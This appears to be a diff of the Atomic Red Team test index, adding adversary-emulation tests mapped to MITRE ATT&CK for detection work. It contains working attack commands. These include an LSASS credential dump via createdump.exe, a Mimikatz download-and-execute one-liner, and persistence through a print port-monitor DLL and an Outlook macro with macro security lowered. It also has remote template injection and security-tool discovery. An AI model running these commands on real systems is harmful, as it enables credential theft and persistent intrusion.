@@ -5283,7 +5283,31 @@ privilege-escalation:
       - Travis Smith, Tripwire
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1547.010
+    atomic_tests:
+    - name: Add Port Monitor persistence in Registry
+      auto_generated_guid: d34ef297-f178-4462-871e-9ce618d44e50
+      description: Add key-value pair to a Windows Port Monitor registry. On the subsequent
+        reboot dll will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.
+      supported_platforms:
+      - windows
+      input_arguments:
+        monitor_dll:
+          description: Addition to port monitor registry key. Normally refers to a
+            DLL name in C:\Windows\System32. arbitrary DLL can be loaded if permissions
+            allow writing a fully-qualified pathname for that DLL.
+          type: Path
+          default: C:\Path\AtomicRedTeam.dll
+      executor:
+        command: 'reg add "hklm\system\currentcontrolset\control\print\monitors\ART"
+          /v "Atomic Red Team" /d "#{monitor_dll}" /t REG_SZ
+
+'
+        cleanup_command: 'reg delete "hklm\system\currentcontrolset\control\print\monitors\ART"
+
+'
+        name: command_prompt
+        elevation_required: true
   T1055.002:
     technique:
       external_references:
@@ -7828,7 +7852,7 @@ privilege-escalation:
       identifier: T1053.006
     atomic_tests:
     - name: Create Systemd Service and Timer
-      auto_generated_guid: 42d33451-0a3c-4292-b753-9dbdcd67a0d3
+      auto_generated_guid: f4983098-bb13-44fb-9b2c-46149961807b
       description: "This test creates Systemd service and timer then starts and enables
         the Systemd timer \n"
       supported_platforms:
@@ -12291,13 +12315,14 @@ persistence:
 '
       dependency_executor_name: powershell
       dependencies:
-      - description: 'chrome must be installed
+      - description: 'Chrome must be installed
 
 '
-        prereq_command: if (cmd /c "chrome 2>nul") {exit 0} else {exit 1}
-        get_prereq_command: |
-          Invoke-WebRequest -OutFile $env:temp\ChromeStandaloneSetup64.exe #{chrome_url}
-          Start-Process $env:temp\ChromeStandaloneSetup64.exe /S
+        prereq_command: if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe")
+          -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"))
+          {exit 0} else {exit 1}
+        get_prereq_command: "Invoke-WebRequest -OutFile $env:temp\\ChromeStandaloneSetup64.exe
+          #{chrome_url}\nStart-Process $env:temp\\ChromeStandaloneSetup64.exe /S     \n"
       executor:
         name: powershell
         elevation_required: true
@@ -12306,10 +12331,10 @@ persistence:
           foreach ($extension in $extList) {
             New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force
             New-ItemProperty -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -Name "update_url" -Value "https://clients2.google.com/service/update2/crx" -PropertyType "String" -Force}
-          Start-Process -FilePath "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
+          Start chrome
           Start-Sleep -Seconds 30
           Stop-Process -Name "chrome"
-        cleanup_command: |-
+        cleanup_command: |
           $extList = #{extension_id}
           foreach ($extension in $extList) {
           Remove-Item -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -ErrorAction Ignore}
@@ -13939,7 +13964,27 @@ persistence:
       x_mitre_platforms:
       - Windows
       - Office 365
-    atomic_tests: []
+      identifier: T1137
+    atomic_tests:
+    - name: Office Application Startup - Outlook as a C2
+      auto_generated_guid: bfe6ac15-c50b-4c4f-a186-0fc6b8ba936c
+      description: "As outlined in MDSEC's Blog post https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/
+        \nit is possible to use Outlook Macro as a way to achieve persistance and
+        execute arbitrary commands. This transform Outlook into a C2.\nToo achieve
+        this two things must happened on the syste\n- The macro security registry
+        value must be set to '4'\n- A file called VbaProject.OTM must be created in
+        the Outlook Folder.\n"
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security" /t REG_DWORD /d 4
+          if not exist  %APPDATA%\Microsoft\Outlook ( md %APPDATA%\Microsoft\Outlook\ )
+          echo "Atomic Red Team TEST" > %APPDATA%\Microsoft\Outlook\VbaProject.OTM
+        cleanup_command: |
+          reg delete "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security" /f
+          del %APPDATA%\Microsoft\Outlook\VbaProject.OTM
+        name: command_prompt
   T1137.001:
     technique:
       external_references:
@@ -14091,7 +14136,7 @@ persistence:
       - Office 365
       identifier: T1137.002
     atomic_tests:
-    - name: Office Apllication Startup Test Persistence
+    - name: Office Application Startup Test Persistence
       auto_generated_guid: c3e35b58-fe1c-480b-b540-7600fb612563
       description: |
         Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office
@@ -14837,7 +14882,31 @@ persistence:
       - Travis Smith, Tripwire
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1547.010
+    atomic_tests:
+    - name: Add Port Monitor persistence in Registry
+      auto_generated_guid: d34ef297-f178-4462-871e-9ce618d44e50
+      description: Add key-value pair to a Windows Port Monitor registry. On the subsequent
+        reboot dll will be execute under spoolsv with NT AUTHORITY/SYSTEM privilege.
+      supported_platforms:
+      - windows
+      input_arguments:
+        monitor_dll:
+          description: Addition to port monitor registry key. Normally refers to a
+            DLL name in C:\Windows\System32. arbitrary DLL can be loaded if permissions
+            allow writing a fully-qualified pathname for that DLL.
+          type: Path
+          default: C:\Path\AtomicRedTeam.dll
+      executor:
+        command: 'reg add "hklm\system\currentcontrolset\control\print\monitors\ART"
+          /v "Atomic Red Team" /d "#{monitor_dll}" /t REG_SZ
+
+'
+        cleanup_command: 'reg delete "hklm\system\currentcontrolset\control\print\monitors\ART"
+
+'
+        name: command_prompt
+        elevation_required: true
   T1546.013:
     technique:
       external_references:
@@ -16911,7 +16980,7 @@ persistence:
       identifier: T1053.006
     atomic_tests:
     - name: Create Systemd Service and Timer
-      auto_generated_guid: 42d33451-0a3c-4292-b753-9dbdcd67a0d3
+      auto_generated_guid: f4983098-bb13-44fb-9b2c-46149961807b
       description: "This test creates Systemd service and timer then starts and enables
         the Systemd timer \n"
       supported_platforms:
@@ -18820,6 +18889,7 @@ credential-access:
         prereq_command: |
           try {
             New-Object -COMObject "word.Application" | Out-Null
+            $process = "winword"
             Stop-Process -Name $process
             exit 0
           } catch { exit 1 }
@@ -20786,6 +20856,46 @@ credential-access:
       executor:
         command: 'IEX (New-Object Net.WebClient).DownloadString(''#{remote_script}'');
           Invoke-Mimikatz -DumpCreds
+
+'
+        name: powershell
+        elevation_required: true
+    - name: Dump LSASS with .Net 5 createdump.exe
+      auto_generated_guid: 9d0072c8-7cca-45c4-bd14-f852cfa35cf0
+      description: "This test uses the technique describe in this tweet \n(https://twitter.com/bopin2020/status/1366400799199272960?s=20)
+        from @bopin2020 in order to dump lsass\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        output_file:
+          description: Path where resulting dump should be placed
+          type: Path
+          default: C:\Windows\Temp\dotnet-lsass.dmp
+        createdump_exe:
+          description: Path of createdump.exe executable
+          type: Path
+          default: C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.*.*\createdump.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Computer must have createdump.exe from .Net 5
+
+'
+        prereq_command: 'if (Test-Path ''#{createdump_exe}'') {exit 0} else {exit
+          1}
+
+'
+        get_prereq_command: 'echo ".NET 5 must be installed manually." "For the very
+          brave a copy of the executable can be found here: https://github.com/Scoubi/RedTeam-Tools/blob/main/createdump.exe"
+
+'
+      executor:
+        command: |
+          echo "Createdump Path #{createdump_exe}"
+          $LSASS = tasklist | findstr "lsass"
+          $FIELDS = $LSASS -split "\s+"
+          $ID = $FIELDS[1]
+          & "#{createdump_exe}" -u -f #{output_file} $ID
+        cleanup_command: 'del #{output_file}
 
 '
         name: powershell
@@ -32179,7 +32289,7 @@ defense-evasion:
           sed -i '$ d' /etc/#{libaudit_config_file_name}
         name: bash
         elevation_required: true
-    - name: Lgging Configuration Changes on Linux Host
+    - name: Logging Configuration Changes on Linux Host
       auto_generated_guid: 7d40bc58-94c7-4fbb-88d9-ebce9fcdb60c
       description: 'Emulates modification of syslog configuration.
 
@@ -34192,7 +34302,20 @@ defense-evasion:
       - Bartosz Jerzman
       x_mitre_version: '1.3'
       x_mitre_is_subtechnique: false
-    atomic_tests: []
+      identifier: T1036
+    atomic_tests:
+    - name: System File Copied to Unusual Location
+      auto_generated_guid: 51005ac7-52e2-45e0-bdab-d17c6d4916cd
+      description: It may be suspicious seeing a file copy of an EXE in System32 or
+        SysWOW64 to a non-system directory or executing from a non-system directory.
+      supported_platforms:
+      - windows
+      executor:
+        command: |-
+          copy %WINDIR%\System32\cmd.exe /Y %ALLUSERSPROFILE%\cmd.exe
+          start %ALLUSERSPROFILE%\cmd.exe
+        cleanup_command: del %ALLUSERSPROFILE%\cmd.exe >nul 2>&1
+        name: command_prompt
   T1036.005:
     technique:
       external_references:
@@ -35767,20 +35890,17 @@ defense-evasion:
       supported_platforms:
       - windows
       input_arguments:
-        exe_payload:
-          description: EXE to execute
-          type: Path
-          default: "%temp%\\temp_T1027.zip\\T1027.exe"
         url_path:
           description: url to download Exe
           type: url
           default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip
       dependency_executor_name: powershell
       dependencies:
-      - description: 'T1027.exe must exist on disk at specified location
+      - description: 'T1027.exe must exist on disk at $env:temp\temp_T1027.zip\T1027.exe
 
 '
-        prereq_command: 'if (Test-Path #{exe_payload}) {exit 0} else {exit 1}
+        prereq_command: 'if (Test-Path $env:temp\temp_T1027.zip\T1027.exe) {exit 0}
+          else {exit 1}
 
 '
         get_prereq_command: |
@@ -35788,7 +35908,7 @@ defense-evasion:
           Invoke-WebRequest "#{url_path}" -OutFile "$env:temp\T1027.zip"
           Expand-Archive -path "$env:temp\T1027.zip" -DestinationPath "$env:temp\temp_T1027.zip\" -Force
       executor:
-        command: '"#{exe_payload}"
+        command: '"%temp%\temp_T1027.zip\T1027.exe"
 
 '
         cleanup_command: |
@@ -40006,10 +40126,6 @@ defense-evasion:
       supported_platforms:
       - windows
       input_arguments:
-        microsoft_wordpath:
-          description: path to office folder
-          type: path
-          default: C:\Program Files\Microsoft Office\Office16
         remote_url:
           description: url to document
           type: url
@@ -40020,8 +40136,8 @@ defense-evasion:
           must be provided
 
 '
-        prereq_command: 'if (Test-Path "#{microsoft_wordpath}\protocolhandler.exe")
-          {exit 0} else {exit 1}
+        prereq_command: 'if (Test-Path "(Resolve-Path "C:\Program Files*\Microsoft
+          Office\root\Office16")\protocolhandler.exe") {exit 0} else {exit 1}
 
 '
         get_prereq_command: 'write-host "Install Microsoft Word or provide correct
@@ -40031,9 +40147,9 @@ defense-evasion:
       executor:
         name: command_prompt
         elevation_required: false
-        command: '"#{microsoft_wordpath}\protocolhandler.exe" "ms-word:nft|u|#{remote_url}"
-
-'
+        command: |
+          FOR /F "tokens=2*" %a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe" /V PATH') do set microsoft_wordpath=%b
+          call "%microsoft_wordpath%\protocolhandler.exe" "ms-word:nft|u|#{remote_url}"
     - name: Microsoft.Workflow.Compiler.exe Payload Execution
       auto_generated_guid: 7cbb0f26-a4c1-4f77-b180-a009aa05637e
       description: 'Emulates attack with Microsoft.Workflow.Compiler.exe running a
@@ -41045,7 +41161,37 @@ defense-evasion:
       - Brian Wiltse @evalstrings
       - Patrick Campbell, @pjcampbe11
       x_mitre_version: '1.2'
-    atomic_tests: []
+      identifier: T1221
+    atomic_tests:
+    - name: WINWORD Remote Template Injection
+      auto_generated_guid: 1489e08a-82c7-44ee-b769-51b72d03521d
+      description: 'Open a .docx file that loads a remote .dotm macro enabled template.
+        Executes the code specified within the .dotm template.Requires download of
+        WINWORD found in Microsoft Ofiice at Microsoft: https://www.microsoft.com/en-us/download/office.aspx.  Opens
+        Calculator.exe when test sucessfully executed, while AV turned off.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        docx file:
+          description: Location of the test docx file on the local filesystem.
+          type: Path
+          default: PathToAtomicsFolder\T1221\src\Calculator.docx
+        dotm template:
+          description: Location of the test dotm template on the remote server.
+          type: Path
+          default: https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1221/src/opencalc.dotm
+      dependency_executor_name: powershell
+      dependencies:
+      - description: ''
+        prereq_command: ''
+        get_prereq_command: ''
+      executor:
+        command: 'start PathToAtomicsFolder\T1221\src\Calculator.docx
+
+'
+        name: command_prompt
   T1055.003:
     technique:
       external_references:
@@ -44062,7 +44208,55 @@ impact:
       - Linux
       - macOS
       - Windows
-    atomic_tests: []
+      identifier: T1491.001
+    atomic_tests:
+    - name: Replace Desktop Wallpaper
+      auto_generated_guid: 30558d53-9d76-41c4-9267-a7bd5184bed3
+      description: 'Downloads an image from a URL and sets it as the desktop wallpaper.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        url_of_wallpaper:
+          description: URL pointing to the image file you wish to set as wallpaper
+          type: url
+          default: https://redcanary.com/wp-content/uploads/Atomic-Red-Team-Logo.png
+        pointer_to_orginal_wallpaper:
+          description: Full path to where a file containing the original wallpaper
+            location will be saved
+          type: String
+          default: "$env:TEMP\\T1491.001-OrginalWallpaperLocation"
+        wallpaper_location:
+          description: Full path to where the downloaded wallpaper image will be saved
+          type: String
+          default: "$env:TEMP\\T1491.001-newWallpaper.png"
+      executor:
+        command: "$url = \"#{url_of_wallpaper}\"\n$imgLocation = \"#{wallpaper_location}\"\n$orgWallpaper
+          = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\\Control Panel\\Desktop\\'
+          -Name WallPaper).WallPaper\n$orgWallpaper | Out-File -FilePath \"#{pointer_to_orginal_wallpaper}\"\n$updateWallpapercode
+          = @' \nusing System.Runtime.InteropServices; \nnamespace Win32{\n\n    public
+          class Wallpaper{ \n        [DllImport(\"user32.dll\", CharSet=CharSet.Auto)]
+          \n         static extern int SystemParametersInfo (int uAction , int uParam
+          , string lpvParam , int fuWinIni) ; \n         \n         public static
+          void SetWallpaper(string thePath){ \n            SystemParametersInfo(20,0,thePath,3);
+          \n        }\n    }\n} \n'@\n$wc = New-Object System.Net.WebClient  \ntry{
+          \ \n    $wc.DownloadFile($url, $imgLocation)\n    add-type $updateWallpapercode
+          \n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\n} \ncatch [System.Net.WebException]{
+          \ \n    Write-Host(\"Cannot download $url\") \n    add-type $updateWallpapercode
+          \n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\n} \nfinally{    \n
+          \   $wc.Dispose()  \n}\n"
+        cleanup_command: "$updateWallpapercode = @' \nusing System.Runtime.InteropServices;
+          \nnamespace Win32{\n\n    public class Wallpaper{ \n        [DllImport(\"user32.dll\",
+          CharSet=CharSet.Auto)] \n         static extern int SystemParametersInfo
+          (int uAction , int uParam , string lpvParam , int fuWinIni) ; \n         \n
+          \        public static void SetWallpaper(string thePath){ \n            SystemParametersInfo(20,0,thePath,3);
+          \n        }\n    }\n} \n'@\nif (Test-Path -Path #{pointer_to_orginal_wallpaper}
+          -PathType Leaf) {\n     $orgImg = Get-Content -Path \"#{pointer_to_orginal_wallpaper}\"\n
+          \    add-type $updateWallpapercode \n     [Win32.Wallpaper]::SetWallpaper($orgImg)\n}\nRemove-Item
+          \"#{pointer_to_orginal_wallpaper}\" -ErrorAction Ignore\nRemove-Item \"#{wallpaper_location}\"
+          -ErrorAction Ignore\n"
+        name: powershell
   T1498:
     technique:
       external_references:
@@ -46922,15 +47116,10 @@ discovery:
         Upon execution, avalaible network shares will be displayed in the powershell session
       supported_platforms:
       - windows
-      input_arguments:
-        computer_name:
-          description: Computer name to find a mount on.
-          type: string
-          default: localhost
       executor:
-        command: |
-          net view \\#{computer_name}
-          get-smbshare -Name #{computer_name}
+        command: 'get-smbshare
+
+'
         name: powershell
     - name: View available share drives
       auto_generated_guid: ab39a04f-0c93-4540-9ff2-83f862c385ae
@@ -47954,19 +48143,29 @@ discovery:
           get-process | ?{$_.Description -like "*defender*"}
           get-process | ?{$_.Description -like "*cylance*"}
         name: powershell
-    - name: Security Software Discovery - ps
+    - name: Security Software Discovery - ps (macOS)
       auto_generated_guid: ba62ce11-e820-485f-9c17-6f3c857cd840
       description: |
         Methods to identify Security Software on an endpoint
-        when sucessfully executed, command shell  is going to display AV software it is running( Little snitch or carbon black ).
+        when sucessfully executed, command shell  is going to display AV/Security software it is running.
       supported_platforms:
-      - linux
       - macos
       executor:
-        command: |
-          ps -ef | grep Little\ Snitch | grep -v grep
-          ps aux | grep CbOsxSensorService
-          ps aux | grep falcond
+        command: 'ps aux | egrep ''Little\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu''
+
+'
+        name: sh
+    - name: Security Software Discovery - ps (Linux)
+      auto_generated_guid: 23b91cd2-c99c-4002-9e41-317c63e024a2
+      description: |
+        Methods to identify Security Software on an endpoint
+        when sucessfully executed, command shell  is going to display AV/Security software it is running.
+      supported_platforms:
+      - linux
+      executor:
+        command: 'ps aux | egrep ''falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd''
+
+'
         name: sh
     - name: Security Software Discovery - Sysmon Service
       auto_generated_guid: fe613cf3-8009-4446-9a0f-bc78a15b66c9
@@ -48432,6 +48631,19 @@ discovery:
         command: 'cscript #{vbscript}'
         name: powershell
         elevation_required: false
+    - name: Environment variables discovery
+      auto_generated_guid: f400d1c0-1804-4ff8-b069-ef5ddd2adbf3
+      description: 'Identify all environment variables. Upon execution, environments
+        variables and your path info will be displayed.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        command: 'set
+
+'
+        name: command_prompt
   T1016:
     technique:
       id: attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0
@@ -48624,6 +48836,26 @@ discovery:
       executor:
         command: "#{recon_commands}\n"
         name: command_prompt
+    - name: List macOS Firewall Rules
+      auto_generated_guid: ff1d8c25-2aa4-4f18-a425-fede4a41ee88
+      description: "\"This will test if the macOS firewall is enabled and/or show
+        what rules are configured. Must be run with elevated privileges. Upon successful
+        execution, these commands will output various information about the firewall
+        configuration, including status and specific port/protocol blocks or allows.
+        \n\nUsing `defaults`, additional arguments can be added to see filtered details,
+        such as `globalstate` for global configuration (\\\"Is it on or off?\\\"),
+        `firewall` for common application allow rules, and `explicitauths` for specific
+        rules configured by the user. \n\nUsing `socketfilterfw`, flags such as --getglobalstate
+        or --listapps can be used for similar filtering. At least one flag is required
+        to send parseable output to standard out. \n"
+      supported_platforms:
+      - macos
+      executor:
+        command: |
+          sudo defaults read /Library/Preferences/com.apple.alf
+          sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
+        name: bash
+        elevation_required: true
   T1049:
     technique:
       object_marking_refs:
@@ -54985,6 +55217,7 @@ execution:
           description: Path to PsExec
           type: string
           default: C:\PSTools\PsExec.exe
+      dependency_executor_name: powershell
       dependencies:
       - description: 'PsExec tool from Sysinternals must exist on disk at specified
           location (#{psexec_exe})
@@ -55292,7 +55525,7 @@ execution:
       identifier: T1053.006
     atomic_tests:
     - name: Create Systemd Service and Timer
-      auto_generated_guid: 42d33451-0a3c-4292-b753-9dbdcd67a0d3
+      auto_generated_guid: f4983098-bb13-44fb-9b2c-46149961807b
       description: "This test creates Systemd service and timer then starts and enables
         the Systemd timer \n"
       supported_platforms:
@@ -62372,13 +62605,14 @@ initial-access:
 '
       dependency_executor_name: powershell
       dependencies:
-      - description: 'chrome must be installed
+      - description: 'Chrome must be installed
 
 '
-        prereq_command: if (cmd /c "chrome 2>nul") {exit 0} else {exit 1}
-        get_prereq_command: |
-          Invoke-WebRequest -OutFile $env:temp\ChromeStandaloneSetup64.exe #{chrome_url}
-          Start-Process $env:temp\ChromeStandaloneSetup64.exe /S
+        prereq_command: if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe")
+          -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"))
+          {exit 0} else {exit 1}
+        get_prereq_command: "Invoke-WebRequest -OutFile $env:temp\\ChromeStandaloneSetup64.exe
+          #{chrome_url}\nStart-Process $env:temp\\ChromeStandaloneSetup64.exe /S     \n"
       executor:
         name: powershell
         elevation_required: true
@@ -62387,10 +62621,10 @@ initial-access:
           foreach ($extension in $extList) {
             New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force
             New-ItemProperty -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -Name "update_url" -Value "https://clients2.google.com/service/update2/crx" -PropertyType "String" -Force}
-          Start-Process -FilePath "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
+          Start chrome
           Start-Sleep -Seconds 30
           Stop-Process -Name "chrome"
-        cleanup_command: |-
+        cleanup_command: |
           $extList = #{extension_id}
           foreach ($extension in $extList) {
           Remove-Item -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -ErrorAction Ignore}
